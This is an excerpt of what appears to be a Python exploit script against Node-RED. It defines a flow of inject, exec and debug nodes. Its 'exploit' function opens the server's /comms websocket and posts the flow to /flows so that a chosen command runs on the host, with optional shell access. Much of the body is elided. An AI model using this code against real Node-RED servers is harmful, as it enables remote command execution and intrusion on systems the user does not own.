...
EXEC_FLOW = [{'id': FLOW_NAME, 'type': 'tab', 'label': FLOW_NAME, 'disabled': False, 'info': ''}, {'id': INJECT_BLOCK_NAME, 'type': 'inject', 'z': FLOW_NAME, 'name': '', 'topic': '', 'payload': '', 'payloadType': 'date', 'repeat': '', 'crontab': '', 'once': False, 'onceDelay': 0.1, 'x': 214, 'y': 307, 'wires': [[EXEC_BLOCK_NAME]]}, {'id': EXEC_BLOCK_NAME, 'type': 'exec', 'z': FLOW_NAME, 'command': '', 'addpay': False, 'append': '', 'useSpawn': 'False', 'timer': '', 'oldrc': False, 'name': '', 'x': 411, 'y': 318.5, 'wires': [[DEBUG_BLOCK_NAME], [DEBUG_BLOCK_NAME]]}, {'id': DEBUG_BLOCK_NAME, 'type': 'debug', 'z': FLOW_NAME, 'name': '', 'active': True, 'tosidebar': True, 'console': False, 'tostatus': False, 'complete': 'false', 'x': 618, 'y': 315, 'wires': []}]
...
async def exploit(url, command, shell=False, access_token=None):
    ...
    async with websockets.connect('{}/comms'.format(ws_url)) as websocket:
        ...
        try:
            ...
            resp = requests.post('{}/flows'.format(url), json=payload, headers=headers)
